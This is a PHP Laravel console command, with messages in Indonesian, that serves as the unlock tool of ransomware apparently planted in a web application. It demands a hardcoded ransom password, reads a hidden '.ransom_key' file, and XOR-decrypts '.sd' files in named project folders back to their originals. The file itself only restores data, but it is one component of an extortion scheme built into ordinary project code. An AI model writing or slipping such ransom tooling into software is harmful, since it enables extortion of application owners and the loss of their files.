<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\File;

class UnlockApp extends Command
{
    protected $signature = 'unlock {password?}';
    protected $description = 'Buka semua file .sd';

    public function handle()
    {
        $input = $this->argument('password') ?? $this->ask('Password tebusan');

        if ($input !== 'cat2025rahasia') {
            $this->error('Password salah bro!');
            return;
        }

        $key = file_get_contents(storage_path('app/.ransom_key'));
        $targets = ['public/argon', 'resources/views/livewire/peserta'];
        $count = 0;

        foreach ($targets as $dir) {
            foreach (glob($dir . '/**/*.sd') as $file) {
                $enc = file_get_contents($file);
                $dec = base64_decode($enc) ^ str_repeat($key, strlen(base64_decode($enc)));
                $orig = preg_replace('/\.sd$/', '', $file);
                file_put_contents($orig, $dec);
                unlink($file);
                $this->line("Restored: " . basename($orig));
                $count++;
            }
        }

        $this->info("SUKSES! $count file .sd berhasil dibalikin!");
    }
}
